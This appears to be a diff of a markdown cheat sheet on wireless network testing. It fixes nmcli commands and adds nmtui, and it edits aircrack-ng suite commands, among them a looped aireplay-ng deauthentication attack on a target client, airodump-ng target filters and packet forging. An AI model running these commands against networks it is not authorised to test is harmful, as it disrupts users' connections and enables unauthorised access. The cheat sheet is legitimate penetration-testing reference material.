@@ -6,42 +6,47 @@
   * [Collecting and Cracking](#collecting-and-cracking)
   * [WEP without clients](#wep-without-clients)
   * [WPA/WPA2 with clients](#wpawpa2-with-clients)
-  * [aircrack-ng](#aircrack-ng)
-  * [airmon-ng](#airmon-ng)
-  * [aireplay-ng](#aireplay-ng)
-     * [Quick summary](#quick-summary)
-     * [Deauthentication](#deauthentication)
-     * [Fake Authentication](#fake-authentication)
-     * [Interactive packet replay](#interactive-packet-replay)
-     * [ARP request replay attack](#arp-request-replay-attack)
-     * [KoreK chopchop attack](#korek-chopchop-attack)
-     * [Fragmentation attack](#fragmentation-attack)
-     * [packetforge-ng](#packetforge-ng)
-  * [Quick &amp; Useful](#quick--useful)
-     * [Loops](#loops)
-     * [Regex](#regex)
-     * [Force Channel](#force-channel)
-     * [Renaming interface (temporary)](#renaming-interface-temporary)
-     * [Wireshark &amp; tshark](#wireshark--tshark)
+  * [aircrack-ng Suite](#aircrack-ng)
+    * [airmon-ng](#airmon-ng)
+    * [aireplay-ng](#aireplay-ng)
+    * [Quick summary](#quick-summary)
+    * [Deauthentication](#deauthentication)
+    * [Fake Authentication](#fake-authentication)
+    * [Interactive packet replay](#interactive-packet-replay)
+    * [ARP request replay attack](#arp-request-replay-attack)
+    * [KoreK chopchop attack](#korek-chopchop-attack)
+    * [Fragmentation attack](#fragmentation-attack)
+    * [packetforge-ng](#packetforge-ng)
+* [Quick &amp; Useful](#quick--useful)
+  * [Loops](#loops)
+  * [Regex](#regex)
+  * [Force Channel](#force-channel)
+  * [Renaming interface (temporary)](#renaming-interface-temporary)
+  * [Wireshark &amp; tshark](#wireshark--tshark)
 * [Sources](#sources)
 
 ## Procedures, Notes, and Tips
 
 ### Network Manager CLI
-Using [nmcli](https://manpages.ubuntu.com/manpages/bionic/en/man1/nmcli.1.html) to list and connect to wifi networks.
+Using [nmcli](https://manpages.ubuntu.com/manpages/bionic/en/man1/nmcli.1.html) to list and connect to WiFi networks.
 
 List the available networks.
 ```bash
-$ nmcli d wifi list
+$ nmcli device wifi list
 ```
 
 Connect to the available network.
 ```bash
-$ nmcli c up ap-name
+$ nmcli connection up ap-name
+```
+
+Using [nmtui](https://manpages.ubuntu.com/manpages/xenial/en/man1/nmtui.1.html) to list and connect to WiFi networks.
+```bash
+$ nmtui
 ```
 
 ### Collecting and Cracking
-Check the wireless interface(s) with iwconfig` and start monitoring mode.
+Check the wireless interface(s) with `iwconfig` and start monitoring mode.
 ```
 $ airmon-ng start wlx9cefd5fd1181
 ```
@@ -202,19 +207,20 @@ packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y 
 ### Loops
 Loop deauthentication attack to target client.
 ```bash
-for s in `seq 1 1000`; do sleep 1 && aireplay-ng -0 1 -e ap_name -a ap_mac -c # wlan0mon; done
+for s in `seq 1 1000`; do sleep 1 && aireplay-ng -0 1 -e ap_name -a ap_mac -c <number> wlan0mon; done
 ```
 
 ### Regex
 Filter target ESSID's.
 ```bash
-airodump-ng wlan0mon --essid-regex "^(ap_name).*$"
+$ airodump-ng wlan0mon --essid-regex "^(ap_name).*$"
+$ airodump-ng wlan0mon --essid-regex ^.*(one|two|three).*$
 ```
 
 ### Force Channel
 Force wireless interface to a specific channel. Good for injection card.
 ```bash
-$ ifconfig wlan1mon 6
+$ iwconfig wlan1mon channel 6
 ```
 
 ### Renaming interface (temporary)
